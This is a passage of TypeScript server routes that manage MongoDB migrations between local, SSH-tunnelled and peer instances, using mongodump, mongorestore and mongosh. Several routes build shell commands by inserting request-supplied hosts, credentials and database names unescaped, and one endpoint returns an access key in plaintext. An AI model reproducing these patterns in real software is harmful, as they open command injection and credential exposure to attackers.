  /** Get this CDS's own AI access key (used to display to the user for copy/paste) */
  function getLocalAccessKey(): string | null {
    return stateService.getCustomEnv()['AI_ACCESS_KEY'] || process.env.AI_ACCESS_KEY || null;
  }

  /** Best-effort public base URL of this CDS, derived from the current request */
  function guessLocalBaseUrl(req: import('express').Request): string {
    const proto = (req.headers['x-forwarded-proto'] as string) || req.protocol || 'https';
    const host = (req.headers['x-forwarded-host'] as string) || req.headers.host || 'localhost';
    return `${proto}://${host}`;
  }

  /**
   * Make an authenticated HTTP/S request to a CDS peer. Returns the raw
   * response object so the caller can stream the body.
   */
  function peerRequest(
    peer: CdsPeer,
    apiPath: string,
    method: 'GET' | 'POST' | 'PUT' | 'DELETE',
    body?: unknown,
  ): Promise<http.IncomingMessage> {
    return new Promise((resolve, reject) => {
      let url: URL;
      try { url = new URL(peer.baseUrl.replace(/\/$/, '') + apiPath); } catch (e) { reject(e); return; }
      const lib = url.protocol === 'https:' ? https : http;
      const payload = body !== undefined ? Buffer.from(JSON.stringify(body)) : null;
      const req = lib.request({
        method,
        protocol: url.protocol,
        hostname: url.hostname,
        port: url.port || (url.protocol === 'https:' ? 443 : 80),
        path: url.pathname + url.search,
        headers: {
          'X-AI-Access-Key': peer.accessKey,
          'X-CDS-Peer-Call': '1',
          Accept: 'application/json, application/octet-stream',
          ...(payload ? { 'Content-Type': 'application/json', 'Content-Length': String(payload.length) } : {}),
        },
        // Large dumps can take many minutes — disable the 2-minute default.
        timeout: 0,
      }, (res) => resolve(res));
      req.on('error', reject);
      req.setTimeout(0);
      if (payload) req.write(payload);
      req.end();
    });
  }

  /** Make a peer request and parse the response body as JSON */
  async function peerRequestJson<T>(peer: CdsPeer, apiPath: string, method: 'GET' | 'POST' | 'PUT' | 'DELETE', body?: unknown): Promise<T> {
    const res = await peerRequest(peer, apiPath, method, body);
    const chunks: Buffer[] = [];
    for await (const c of res) chunks.push(c as Buffer);
    const text = Buffer.concat(chunks).toString('utf-8');
    if ((res.statusCode || 500) >= 400) {
      let err = text;
      try { const j = JSON.parse(text); err = j.error || j.message || text; } catch { /* raw */ }
      throw new Error(`远程 CDS 返回 ${res.statusCode}: ${err}`);
    }
    try { return JSON.parse(text) as T; } catch { return text as unknown as T; }
  }

  // GET /api/data-migrations — list all migration tasks
  router.get('/data-migrations', (_req, res) => {
    res.json(stateService.getDataMigrations());
  });

  // POST /api/data-migrations — create a new migration task
  router.post('/data-migrations', (req, res) => {
    const { name, dbType, source, target, collections } = req.body as {
      name: string;
      dbType: 'mongodb';
      source: MongoConnectionConfig;
      target: MongoConnectionConfig;
      collections?: string[];
    };
    if (!name || !dbType || !source || !target) {
      res.status(400).json({ error: '缺少必填字段: name, dbType, source, target' });
      return;
    }
    const id = `mig-${Date.now().toString(36)}`;
    const migration: DataMigration = {
      id,
      name,
      dbType,
      source,
      target,
      collections: collections?.length ? collections : undefined,
      status: 'pending',
      progress: 0,
      createdAt: new Date().toISOString(),
    };
    stateService.addDataMigration(migration);
    stateService.save();
    res.json(migration);
  });

  // DELETE /api/data-migrations/:id — delete a migration task
  router.delete('/data-migrations/:id', (req, res) => {
    const { id } = req.params;
    const migration = stateService.getDataMigration(id);
    if (!migration) { res.status(404).json({ error: '迁移任务不存在' }); return; }
    if (migration.status === 'running') { res.status(400).json({ error: '任务正在运行中，无法删除' }); return; }
    stateService.removeDataMigration(id);
    stateService.save();
    res.json({ message: '已删除' });
  });

  // POST /api/data-migrations/check-tools — check if mongodump/mongorestore are available, auto-install if not
  router.post('/data-migrations/check-tools', async (_req, res) => {
    try {
      // Check if mongodump exists
      const checkResult = await shell.exec('which mongodump 2>/dev/null || which /usr/bin/mongodump 2>/dev/null || echo "NOT_FOUND"');
      const hasTool = !checkResult.stdout.includes('NOT_FOUND');
      if (hasTool) {
        // Get version
        const verResult = await shell.exec('mongodump --version 2>&1 | head -1');
        res.json({ installed: true, version: verResult.stdout.trim() });
        return;
      }
      // Auto-install mongodb-database-tools
      res.json({ installed: false, message: '正在安装 mongodb-database-tools...' });
    } catch (e) {
      res.status(500).json({ error: (e as Error).message });
    }
  });

  // POST /api/data-migrations/install-tools — install mongodump/mongorestore
  router.post('/data-migrations/install-tools', async (_req, res) => {
    initSSE(res);
    const send = (msg: string) => sendSSE(res, 'progress', { message: msg });
    try {
      send('检测操作系统...');
      const osInfo = await shell.exec('cat /etc/os-release 2>/dev/null || echo "unknown"');
      const isDebian = osInfo.stdout.includes('debian') || osInfo.stdout.includes('ubuntu');
      const isAlpine = osInfo.stdout.includes('alpine');
      const isRhel = osInfo.stdout.includes('rhel') || osInfo.stdout.includes('centos') || osInfo.stdout.includes('fedora');

      if (isDebian) {
        send('检测到 Debian/Ubuntu，正在安装 mongodb-database-tools...');
        // Try apt-get first
        const aptResult = await shell.exec(
          'apt-get update -qq 2>/dev/null && apt-get install -y -qq mongodb-database-tools 2>&1 || echo "APT_FAILED"',
          { timeout: 120000 }
        );
        if (aptResult.stdout.includes('APT_FAILED')) {
          // Fallback: download from MongoDB directly
          send('apt 安装失败，尝试直接下载二进制文件...');
          await installMongoToolsBinary(shell, send);
        } else {
          send('apt 安装成功');
        }
      } else if (isAlpine) {
        send('检测到 Alpine，直接下载二进制文件...');
        await installMongoToolsBinary(shell, send);
      } else if (isRhel) {
        send('检测到 RHEL/CentOS，正在安装...');
        const yumResult = await shell.exec(
          'yum install -y mongodb-database-tools 2>&1 || dnf install -y mongodb-database-tools 2>&1 || echo "YUM_FAILED"',
          { timeout: 120000 }
        );
        if (yumResult.stdout.includes('YUM_FAILED')) {
          send('yum 安装失败，尝试直接下载二进制文件...');
          await installMongoToolsBinary(shell, send);
        }
      } else {
        send('未知系统，尝试直接下载二进制文件...');
        await installMongoToolsBinary(shell, send);
      }

      // Verify installation
      const verifyResult = await shell.exec('mongodump --version 2>&1 | head -1');
      if (verifyResult.exitCode === 0 && verifyResult.stdout.trim()) {
        sendSSE(res, 'done', { installed: true, version: verifyResult.stdout.trim() });
      } else {
        sendSSE(res, 'error', { message: '安装后验证失败，请手动安装 mongodb-database-tools' });
      }
      res.end();
    } catch (e) {
      sendSSE(res, 'error', { message: (e as Error).message });
      res.end();
    }
  });

  // PUT /api/data-migrations/:id — edit a migration task (name, source, target, collections)
  router.put('/data-migrations/:id', (req, res) => {
    const { id } = req.params;
    const existing = stateService.getDataMigration(id);
    if (!existing) { res.status(404).json({ error: '迁移任务不存在' }); return; }
    if (existing.status === 'running') { res.status(400).json({ error: '任务正在运行中，无法编辑' }); return; }
    const { name, source, target, collections } = req.body as Partial<DataMigration>;
    const updates: Partial<DataMigration> = {};
    if (name !== undefined) updates.name = name;
    if (source !== undefined) updates.source = source;
    if (target !== undefined) updates.target = target;
    // collections === [] means "all collections" (undefined), non-empty = subset
    if (collections !== undefined) updates.collections = (collections && collections.length) ? collections : undefined;
    updates.updatedAt = new Date().toISOString();
    stateService.updateDataMigration(id, updates);
    stateService.save();
    res.json(stateService.getDataMigration(id));
  });

  // POST /api/data-migrations/:id/execute — execute a migration task (SSE stream, streaming pipeline)
  //
  // Pipeline:
  //   source producer (mongodump stdout) → pipe → target consumer (mongorestore stdin)
  //
  // Producers (by source.type):
  //   - local  : spawn mongodump against CDS infra MongoDB
  //   - remote : spawn mongodump; or ssh jump → remote mongodump (pipe mode, no port forwarding)
  //   - cds    : HTTP POST to peer's /local-dump endpoint, read response body
  //
  // Consumers (by target.type):
  //   - local  : spawn mongorestore against CDS infra MongoDB, write to stdin
  //   - remote : spawn mongorestore; or ssh jump → remote mongorestore (stdin pipe)
  //   - cds    : HTTP POST to peer's /local-restore endpoint, request body is the stream
  //
  // Zero temp files. Archive+gzip throughout. SSH keepalive so long dumps don't drop.
  router.post('/data-migrations/:id/execute', async (req, res) => {
    const { id } = req.params;
    const migration = stateService.getDataMigration(id);
    if (!migration) { res.status(404).json({ error: '迁移任务不存在' }); return; }
    if (migration.status === 'running') { res.status(400).json({ error: '任务已在运行中' }); return; }

    initSSE(res);
    const send = (progress: number, message: string) => {
      sendSSE(res, 'progress', { progress, message });
      stateService.updateDataMigration(id, { progress, progressMessage: message });
    };

    // SSE keepalive — prevents proxies from closing the connection on long dumps
    const keepAlive = setInterval(() => { try { res.write(`:ka\n\n`); } catch { /* client gone */ } }, 15000);

    // Mark as running
    stateService.updateDataMigration(id, { status: 'running', startedAt: new Date().toISOString(), progress: 0, errorMessage: undefined, log: '' });
    stateService.save();

    let logOutput = '';
    const MAX_LOG = 64 * 1024;
    const appendLog = (line: string) => {
      logOutput += line;
      if (!line.endsWith('\n')) logOutput += '\n';
      if (logOutput.length > MAX_LOG) logOutput = '...(truncated)...\n' + logOutput.slice(-MAX_LOG);
    };

    // Persist log + progress periodically (not on every chunk) to avoid disk thrash
    let lastPersistAt = 0;
    const maybePersist = () => {
      const now = Date.now();
      if (now - lastPersistAt > 2000) {
        lastPersistAt = now;
        stateService.updateDataMigration(id, { log: logOutput });
        stateService.save();
      }
    };

    // Resources to clean up on exit
    const children: Array<{ kill: () => void }> = [];
    const cleanup = () => {
      clearInterval(keepAlive);
      for (const c of children) { try { c.kill(); } catch { /* */ } }
    };

    // Track the most recent progress line so we can turn it into SSE progress
    let fakeProgress = 20; // ratchet 20→90 based on line activity
    const bumpProgress = (delta: number) => { fakeProgress = Math.min(90, fakeProgress + delta); };
    const updateProgressFromLine = (line: string) => {
      const parsed = parseMongoProgressLine(line);
      if (parsed) {
        bumpProgress(1);
        send(fakeProgress, parsed);
      }
    };

    try {
      const cols = migration.collections?.length ? migration.collections : undefined;

      send(2, '准备迁移管道...');

      // ── Build producer ──
      const producer = await buildSourceProducer(
        migration.source,
        cols,
        { appendLog, onProgressLine: updateProgressFromLine, send },
      );
      children.push(producer);

      // ── Build consumer ──
      const consumer = await buildTargetConsumer(
        migration.target,
        migration.source,
        cols,
        { appendLog, onProgressLine: updateProgressFromLine, send },
      );
      children.push(consumer);

      send(15, '管道已建立，开始传输...');

      // Pipe producer → consumer with error propagation
      producer.stdout.on('error', (err: Error) => appendLog(`[pipe] producer error: ${err.message}`));
      consumer.stdin.on('error', (err: Error) => appendLog(`[pipe] consumer error: ${err.message}`));
      producer.stdout.pipe(consumer.stdin);

      // Persist log every few seconds while streaming
      const persistTimer = setInterval(maybePersist, 2000);

      // Wait for both producer and consumer to finish
      await Promise.all([producer.done, consumer.done]);
      clearInterval(persistTimer);

      send(100, '迁移完成！');
      stateService.updateDataMigration(id, {
        status: 'completed',
        progress: 100,
        progressMessage: '迁移完成',
        finishedAt: new Date().toISOString(),
        log: logOutput,
      });
      stateService.save();
      sendSSE(res, 'done', { message: '迁移完成' });
      cleanup();
      res.end();
    } catch (e) {
      const errMsg = (e as Error).message || String(e);
      appendLog(`ERROR: ${errMsg}`);
      stateService.updateDataMigration(id, {
        status: 'failed',
        errorMessage: errMsg,
        finishedAt: new Date().toISOString(),
        log: logOutput,
      });
      stateService.save();
      sendSSE(res, 'error', { message: errMsg });
      cleanup();
      res.end();
    }
  });

  /**
   * Build a producer that emits a `mongodump --archive --gzip` byte stream.
   * Returns a handle with a readable `stdout`, a `done` promise, and `kill()`.
   */
  async function buildSourceProducer(
    source: MongoConnectionConfig,
    cols: string[] | undefined,
    cb: {
      appendLog: (s: string) => void;
      onProgressLine: (line: string) => void;
      send: (progress: number, message: string) => void;
    },
  ): Promise<{ stdout: NodeJS.ReadableStream; stdin?: NodeJS.WritableStream; done: Promise<void>; kill: () => void }> {
    // ── CDS peer source ── fetch from peer's local-dump
    if (source.type === 'cds') {
      const peer = stateService.getCdsPeer(source.cdsPeerId || '');
      if (!peer) throw new Error(`源 CDS 密钥不存在: ${source.cdsPeerId}`);
      cb.send(8, `连接源 CDS 「${peer.name}」...`);
      const peerRes = await peerRequest(peer, '/api/data-migrations/local-dump', 'POST', {
        database: source.database,
        collections: cols,
      });
      if ((peerRes.statusCode || 500) >= 400) {
        const chunks: Buffer[] = [];
        for await (const c of peerRes) chunks.push(c as Buffer);
        throw new Error(`源 CDS 返回 ${peerRes.statusCode}: ${Buffer.concat(chunks).toString('utf-8').slice(0, 400)}`);
      }
      cb.appendLog(`[source] CDS peer ${peer.name} (${peer.baseUrl}) streaming`);
      const done = new Promise<void>((resolve, reject) => {
        peerRes.on('end', resolve);
        peerRes.on('error', reject);
      });
      return {
        stdout: peerRes,
        done,
        kill: () => { try { peerRes.destroy(); } catch { /* */ } },
      };
    }

    // ── Local / remote via mongodump ──
    const eff = source.type === 'local' ? resolveMongoConn(source) : source;
    const dumpArgs = buildMongodumpArgs(
      eff.host, eff.port,
      { username: eff.username, password: eff.password, authDatabase: eff.authDatabase },
      eff.database, cols,
    );

    let cmd: string;
    let argv: string[];
    if (source.sshTunnel?.enabled) {
      cb.send(8, `通过 SSH 连接 ${source.sshTunnel.host}...`);
      const sshBase = buildSshBase(source.sshTunnel);
      const remoteCmd = buildRemoteMongoCmd('mongodump', dumpArgs, source.sshTunnel.dockerContainer);
      cb.appendLog(`[source] ssh ${source.sshTunnel.username}@${source.sshTunnel.host}: ${remoteCmd}`);
      cmd = 'ssh';
      argv = [...sshBase, remoteCmd];
    } else {
      cb.appendLog(`[source] mongodump ${dumpArgs.join(' ')}`);
      cmd = 'mongodump';
      argv = dumpArgs;
    }

    const child = spawn(cmd, argv, { stdio: ['ignore', 'pipe', 'pipe'] });
    let stderrTail = '';
    child.stderr!.on('data', (d: Buffer) => {
      const s = d.toString();
      stderrTail = (stderrTail + s).slice(-2000);
      for (const line of s.split('\n')) {
        if (line) { cb.appendLog(`[dump] ${line}`); cb.onProgressLine(line); }
      }
    });
    const done = new Promise<void>((resolve, reject) => {
      child.on('close', (code) => {
        if (code === 0) resolve();
        else reject(new Error(`mongodump 失败 (exit ${code}): ${stderrTail.slice(-400)}`));
      });
      child.on('error', (err) => reject(new Error(`无法启动 mongodump: ${err.message}`)));
    });
    return {
      stdout: child.stdout!,
      done,
      kill: () => { try { child.kill('SIGKILL'); } catch { /* */ } },
    };
  }

  /**
   * Build a consumer that accepts a `mongodump --archive --gzip` byte stream.
   * Returns a handle with a writable `stdin`, a `done` promise, and `kill()`.
   */
  async function buildTargetConsumer(
    target: MongoConnectionConfig,
    source: MongoConnectionConfig,
    cols: string[] | undefined,
    cb: {
      appendLog: (s: string) => void;
      onProgressLine: (line: string) => void;
      send: (progress: number, message: string) => void;
    },
  ): Promise<{ stdin: NodeJS.WritableStream; done: Promise<void>; kill: () => void }> {
    // ── CDS peer target ──
    if (target.type === 'cds') {
      const peer = stateService.getCdsPeer(target.cdsPeerId || '');
      if (!peer) throw new Error(`目标 CDS 密钥不存在: ${target.cdsPeerId}`);
      cb.send(12, `连接目标 CDS 「${peer.name}」...`);
      // Build URL with query params for target rename + collection filter
      const qs = new URLSearchParams();
      if (source.database) qs.set('sourceDb', source.database);
      if (target.database) qs.set('targetDb', target.database);
      if (cols && cols.length) qs.set('collections', cols.join(','));
      const apiPath = '/api/data-migrations/local-restore' + (qs.toString() ? '?' + qs.toString() : '');
      const url = new URL(peer.baseUrl.replace(/\/$/, '') + apiPath);
      const lib = url.protocol === 'https:' ? https : http;
      const httpReq = lib.request({
        method: 'POST',
        protocol: url.protocol,
        hostname: url.hostname,
        port: url.port || (url.protocol === 'https:' ? 443 : 80),
        path: url.pathname + url.search,
        headers: {
          'X-AI-Access-Key': peer.accessKey,
          'X-CDS-Peer-Call': '1',
          'Content-Type': 'application/octet-stream',
          // Chunked transfer (no Content-Length, just stream)
          'Transfer-Encoding': 'chunked',
        },
        timeout: 0,
      });
      httpReq.setTimeout(0);
      cb.appendLog(`[target] CDS peer ${peer.name} → ${apiPath}`);

      const done = new Promise<void>((resolve, reject) => {
        httpReq.on('response', (peerRes) => {
          const chunks: Buffer[] = [];
          peerRes.on('data', (d) => chunks.push(d as Buffer));
          peerRes.on('end', () => {
            const text = Buffer.concat(chunks).toString('utf-8');
            try {
              const j = JSON.parse(text);
              if (j && j.log) for (const line of String(j.log).split('\n')) if (line) { cb.appendLog(`[restore] ${line}`); cb.onProgressLine(line); }
            } catch { cb.appendLog(`[target] ${text.slice(0, 500)}`); }
            if ((peerRes.statusCode || 500) >= 400) {
              reject(new Error(`目标 CDS 返回 ${peerRes.statusCode}: ${text.slice(0, 400)}`));
            } else {
              resolve();
            }
          });
          peerRes.on('error', reject);
        });
        httpReq.on('error', (err) => reject(new Error(`连接目标 CDS 失败: ${err.message}`)));
      });

      return {
        stdin: httpReq,
        done,
        kill: () => { try { httpReq.destroy(); } catch { /* */ } },
      };
    }

    // ── Local / remote via mongorestore ──
    const eff = target.type === 'local' ? resolveMongoConn(target) : target;
    const restoreArgs = buildMongorestoreArgs(
      eff.host, eff.port,
      { username: eff.username, password: eff.password, authDatabase: eff.authDatabase },
      {
        drop: true,
        sourceDb: source.type !== 'cds' ? source.database : undefined,
        targetDb: eff.database,
        collections: cols,
      },
    );

    let cmd: string;
    let argv: string[];
    if (target.sshTunnel?.enabled) {
      cb.send(12, `通过 SSH 连接 ${target.sshTunnel.host}...`);
      const sshBase = buildSshBase(target.sshTunnel);
      const remoteCmd = buildRemoteMongoCmd('mongorestore', restoreArgs, target.sshTunnel.dockerContainer);
      cb.appendLog(`[target] ssh ${target.sshTunnel.username}@${target.sshTunnel.host}: ${remoteCmd}`);
      cmd = 'ssh';
      argv = [...sshBase, remoteCmd];
    } else {
      cb.appendLog(`[target] mongorestore ${restoreArgs.join(' ')}`);
      cmd = 'mongorestore';
      argv = restoreArgs;
    }

    const child = spawn(cmd, argv, { stdio: ['pipe', 'pipe', 'pipe'] });
    let stderrTail = '';
    const mirror = (prefix: string) => (d: Buffer) => {
      const s = d.toString();
      stderrTail = (stderrTail + s).slice(-2000);
      for (const line of s.split('\n')) {
        if (line) { cb.appendLog(`[${prefix}] ${line}`); cb.onProgressLine(line); }
      }
    };
    child.stderr!.on('data', mirror('restore'));
    child.stdout!.on('data', mirror('restore'));
    const done = new Promise<void>((resolve, reject) => {
      child.on('close', (code) => {
        if (code === 0) resolve();
        else reject(new Error(`mongorestore 失败 (exit ${code}): ${stderrTail.slice(-400)}`));
      });
      child.on('error', (err) => reject(new Error(`无法启动 mongorestore: ${err.message}`)));
    });
    return {
      stdin: child.stdin!,
      done,
      kill: () => { try { child.kill('SIGKILL'); } catch { /* */ } },
    };
  }

  // POST /api/data-migrations/:id/test-connection — test a MongoDB connection
  router.post('/data-migrations/test-connection', async (req, res) => {
    const { connection } = req.body as { connection: MongoConnectionConfig };
    if (!connection) { res.status(400).json({ error: '缺少 connection 参数' }); return; }

    try {
      let host = connection.host;
      let port = connection.port;

      // Resolve local
      if (connection.type === 'local') {
        const mongoInfra = stateService.getInfraServices().find(s => s.id === 'mongodb');
        if (!mongoInfra) { res.json({ success: false, error: '本机 MongoDB 未注册' }); return; }
        host = stateService.getCdsEnvVars()['CDS_HOST'] || '172.17.0.1';
        port = mongoInfra.hostPort;
      }

      // Build mongosh/mongo test command
      let testCmd = `mongosh --host ${host} --port ${port} --eval "db.adminCommand({ping:1})" --quiet`;
      if (connection.username) testCmd = `mongosh --host ${host} --port ${port} -u ${connection.username} -p ${connection.password || ''} --authenticationDatabase ${connection.authDatabase || 'admin'} --eval "db.adminCommand({ping:1})" --quiet`;

      const result = await shell.exec(testCmd, { timeout: 10000 });
      if (result.exitCode === 0) {
        // Get database list
        let listCmd = `mongosh --host ${host} --port ${port} --eval "JSON.stringify(db.adminCommand({listDatabases:1}).databases.map(d=>({name:d.name,sizeOnDisk:d.sizeOnDisk})))" --quiet`;
        if (connection.username) listCmd = `mongosh --host ${host} --port ${port} -u ${connection.username} -p ${connection.password || ''} --authenticationDatabase ${connection.authDatabase || 'admin'} --eval "JSON.stringify(db.adminCommand({listDatabases:1}).databases.map(d=>({name:d.name,sizeOnDisk:d.sizeOnDisk})))" --quiet`;

        const listResult = await shell.exec(listCmd, { timeout: 10000 });
        let databases: unknown[] = [];
        try { databases = JSON.parse(listResult.stdout.trim()); } catch { /* ok */ }
        res.json({ success: true, databases });
      } else {
        // Fallback: try basic TCP connectivity
        const tcpResult = await shell.exec(`timeout 5 bash -c "echo > /dev/tcp/${host}/${port}" 2>&1 || echo "TCP_FAILED"`);
        if (tcpResult.stdout.includes('TCP_FAILED')) {
          res.json({ success: false, error: `无法连接到 ${host}:${port}` });
        } else {
          res.json({ success: false, error: `连接成功但认证失败: ${result.stderr || result.stdout}` });
        }
      }
    } catch (e) {
      res.json({ success: false, error: (e as Error).message });
    }
  });

  // POST /api/data-migrations/list-databases — list databases with sizes
  router.post('/data-migrations/list-databases', async (req, res) => {
    const { connection } = req.body as { connection: MongoConnectionConfig };
    if (!connection) { res.status(400).json({ error: '缺少 connection 参数' }); return; }
    try {
      const conn = resolveMongoConn(connection);
      const evalScript = `JSON.stringify(db.adminCommand({listDatabases:1}).databases.map(d=>({name:d.name,sizeOnDisk:d.sizeOnDisk})))`;
      const cmd = `mongosh --host ${conn.host} --port ${conn.port}${mongoAuthArgs(conn)} --eval "${evalScript}" --quiet 2>/dev/null`;
      const result = await shell.exec(cmd, { timeout: 15000 });
      let databases: Array<{ name: string; sizeOnDisk: number }> = [];
      if (result.exitCode === 0) {
        const lines = result.stdout.trim().split('\n');
        for (const line of lines) {
          const trimmed = line.trim();
          if (trimmed.startsWith('[')) { try { databases = JSON.parse(trimmed); break; } catch { /* */ } }
        }
      }
      // Filter out system databases for cleaner UX
      const userDbs = databases.filter(d => !['admin', 'config', 'local'].includes(d.name));
      const sysDbs = databases.filter(d => ['admin', 'config', 'local'].includes(d.name));
      res.json({ databases: [...userDbs, ...sysDbs] });
    } catch (e) {
      res.json({ databases: [], error: (e as Error).message });
    }
  });

  // POST /api/data-migrations/list-collections — list collections in a database with doc counts
  router.post('/data-migrations/list-collections', async (req, res) => {
    const { connection } = req.body as { connection: MongoConnectionConfig };
    if (!connection) { res.status(400).json({ error: '缺少 connection 参数' }); return; }
    if (!connection.database) { res.status(400).json({ error: '请指定数据库名' }); return; }

    try {
      const conn = resolveMongoConn(connection);
      const db = conn.database!;
      const evalScript = `JSON.stringify(db.getSiblingDB('${db}').getCollectionInfos({type:'collection'}).map(c=>({name:c.name,count:db.getSiblingDB('${db}').getCollection(c.name).estimatedDocumentCount()})))`;
      let cmd = `mongosh --host ${conn.host} --port ${conn.port}${mongoAuthArgs(conn)} --eval "${evalScript}" --quiet 2>/dev/null`;

      const result = await shell.exec(cmd, { timeout: 15000 });
      if (result.exitCode !== 0) {
        res.json({ collections: [], error: result.stderr || 'mongosh 执行失败' });
        return;
      }
      // Parse JSON — mongosh may output extra lines, find the JSON array line
      const lines = result.stdout.trim().split('\n');
      let collections: Array<{ name: string; count: number }> = [];
      for (const line of lines) {
        const trimmed = line.trim();
        if (trimmed.startsWith('[')) {
          try { collections = JSON.parse(trimmed); break; } catch { /* try next line */ }
        }
      }
      collections.sort((a, b) => a.name.localeCompare(b.name));
      res.json({ collections });
    } catch (e) {
      res.json({ collections: [], error: (e as Error).message });
    }
  });

  // GET /api/data-migrations/:id/log — get migration log
  router.get('/data-migrations/:id/log', (req, res) => {
    const migration = stateService.getDataMigration(req.params.id);
    if (!migration) { res.status(404).json({ error: '迁移任务不存在' }); return; }
    res.json({ log: migration.log || '' });
  });

  // POST /api/data-migrations/test-tunnel — verify an SSH tunnel config
  // Runs `ssh user@host echo __cds_ok__` with the supplied credentials.
  router.post('/data-migrations/test-tunnel', async (req, res) => {
    const { sshTunnel } = req.body as { sshTunnel: MongoConnectionConfig['sshTunnel'] };
    if (!sshTunnel || !sshTunnel.host || !sshTunnel.username) {
      res.json({ success: false, error: '请填写 SSH 主机和用户名' });
      return;
    }
    try {
      const sshBase = buildSshBase(sshTunnel);
      // Add 'echo __cds_ok__' as the remote command and enforce a 15s timeout on client side
      const argv = [...sshBase, `echo __cds_ok__`];
      const result = await new Promise<{ code: number; stdout: string; stderr: string }>((resolve) => {
        const child = spawn('ssh', argv, { stdio: ['ignore', 'pipe', 'pipe'] });
        let stdout = ''; let stderr = '';
        const timer = setTimeout(() => { try { child.kill('SIGKILL'); } catch { /* */ } }, 15000);
        child.stdout.on('data', (d) => { stdout += d.toString(); });
        child.stderr.on('data', (d) => { stderr += d.toString(); });
        child.on('close', (code) => { clearTimeout(timer); resolve({ code: code ?? 1, stdout, stderr }); });
        child.on('error', (err) => { clearTimeout(timer); resolve({ code: 1, stdout, stderr: err.message }); });
      });
      if (result.code === 0 && result.stdout.includes('__cds_ok__')) {
        // Optional: also check mongodump availability on the remote side
        let mongoNote = '';
        if (sshTunnel.dockerContainer) {
          mongoNote = `（通过容器 ${sshTunnel.dockerContainer}）`;
        } else {
          const toolCheck = await new Promise<{ code: number; stdout: string }>((resolve) => {
            const child = spawn('ssh', [...sshBase, 'which mongodump 2>/dev/null || echo NOT_FOUND'], { stdio: ['ignore', 'pipe', 'pipe'] });
            let stdout = '';
            const timer = setTimeout(() => { try { child.kill('SIGKILL'); } catch { /* */ } }, 10000);
            child.stdout.on('data', (d) => { stdout += d.toString(); });
            child.on('close', (code) => { clearTimeout(timer); resolve({ code: code ?? 1, stdout }); });
            child.on('error', () => { clearTimeout(timer); resolve({ code: 1, stdout: '' }); });
          });
          if (toolCheck.stdout.includes('NOT_FOUND')) {
            mongoNote = '（⚠ 远程未找到 mongodump；建议配置 docker 容器名）';
          } else {
            mongoNote = '（远程 mongodump 可用）';
          }
        }
        res.json({ success: true, message: `SSH 连接成功 ${mongoNote}` });
      } else {
        res.json({ success: false, error: (result.stderr || 'SSH 连接失败').trim().slice(0, 400) });
      }
    } catch (e) {
      res.json({ success: false, error: (e as Error).message });
    }
  });

  // ─────────────────────────────────────────────────────────────────
  //   CDS Peer Registry (one-click cross-CDS migration)
  // ─────────────────────────────────────────────────────────────────

  // GET /api/data-migrations/my-key — return this CDS's own access key so the user can copy it.
  //
  // Response:
  //   { accessKey: string|null, baseUrl: string, label: string, hint: string }
  //
  // If no key is configured, `accessKey` is null and the caller can show a
  // "set AI_ACCESS_KEY first" banner.
  router.get('/data-migrations/my-key', (req, res) => {
    const accessKey = getLocalAccessKey();
    const baseUrl = guessLocalBaseUrl(req);
    const label = `${baseUrl}`;
    res.json({
      accessKey,
      baseUrl,
      label,
      hint: accessKey
        ? '复制下面的 baseUrl + 访问密钥，在另一台 CDS 的「CDS 密钥管理」中添加即可双向迁移。'
        : '当前 CDS 未设置 AI_ACCESS_KEY，请先在「设置 → 环境变量」中配置 AI_ACCESS_KEY 后再试。',
    });
  });

  // GET /api/data-migrations/peers — list registered peers (access keys are returned masked)
  router.get('/data-migrations/peers', (_req, res) => {
    const peers = stateService.getCdsPeers().map(p => ({
      ...p,
      // Mask the key — show only last 6 chars so the user can recognize it without leaking it in HTTP logs
      accessKey: p.accessKey ? `••••${p.accessKey.slice(-6)}` : '',
    }));
    res.json(peers);
  });

  // POST /api/data-migrations/peers — add a new peer. Auto-verifies by calling the peer's /my-key.
  router.post('/data-migrations/peers', async (req, res) => {
    const { name, baseUrl, accessKey } = req.body as { name?: string; baseUrl?: string; accessKey?: string };
    if (!name || !baseUrl || !accessKey) {
      res.status(400).json({ error: '缺少必填字段: name, baseUrl, accessKey' });
      return;
    }
    try { new URL(baseUrl); } catch { res.status(400).json({ error: 'baseUrl 格式错误' }); return; }
    const peer: CdsPeer = {
      id: `peer-${Date.now().toString(36)}-${Math.random().toString(36).slice(2, 6)}`,
      name,
      baseUrl: baseUrl.replace(/\/$/, ''),
      accessKey,
      createdAt: new Date().toISOString(),
    };
    // Verify — call /my-key to confirm the access key works
    try {
      const probe = await peerRequestJson<{ baseUrl: string; accessKey: string | null }>(peer, '/api/data-migrations/my-key', 'GET');
      peer.lastVerifiedAt = new Date().toISOString();
      peer.remoteLabel = probe.baseUrl || baseUrl;
    } catch (e) {
      res.status(400).json({ error: `验证失败: ${(e as Error).message}` });
      return;
    }
    stateService.addCdsPeer(peer);
    stateService.save();
    // Return masked version
    res.json({ ...peer, accessKey: `••••${accessKey.slice(-6)}` });
  });

  // PUT /api/data-migrations/peers/:id — update peer (name / baseUrl / accessKey)
  router.put('/data-migrations/peers/:id', async (req, res) => {
    const { id } = req.params;
    const existing = stateService.getCdsPeer(id);
    if (!existing) { res.status(404).json({ error: 'CDS 密钥不存在' }); return; }
    const { name, baseUrl, accessKey } = req.body as { name?: string; baseUrl?: string; accessKey?: string };
    const updates: Partial<CdsPeer> = {};
    if (name !== undefined) updates.name = name;
    if (baseUrl !== undefined) updates.baseUrl = baseUrl.replace(/\/$/, '');
    // Only update accessKey if caller provided a value that doesn't look masked (••••)
    if (accessKey !== undefined && !accessKey.startsWith('•')) updates.accessKey = accessKey;
    stateService.updateCdsPeer(id, updates);
    stateService.save();
    const updated = stateService.getCdsPeer(id)!;
    res.json({ ...updated, accessKey: `••••${updated.accessKey.slice(-6)}` });
  });

  // DELETE /api/data-migrations/peers/:id
  router.delete('/data-migrations/peers/:id', (req, res) => {
    const { id } = req.params;
    if (!stateService.getCdsPeer(id)) { res.status(404).json({ error: 'CDS 密钥不存在' }); return; }
    stateService.removeCdsPeer(id);
    stateService.save();
    res.json({ message: '已删除' });
  });

  // POST /api/data-migrations/peers/:id/test — verify a peer's connectivity
  router.post('/data-migrations/peers/:id/test', async (req, res) => {
    const peer = stateService.getCdsPeer(req.params.id);
    if (!peer) { res.status(404).json({ error: 'CDS 密钥不存在' }); return; }
    try {
      const probe = await peerRequestJson<{ baseUrl: string; accessKey: string | null }>(peer, '/api/data-migrations/my-key', 'GET');
      stateService.updateCdsPeer(peer.id, { lastVerifiedAt: new Date().toISOString(), remoteLabel: probe.baseUrl });
      stateService.save();
      res.json({ success: true, remoteLabel: probe.baseUrl, verifiedAt: new Date().toISOString() });
    } catch (e) {
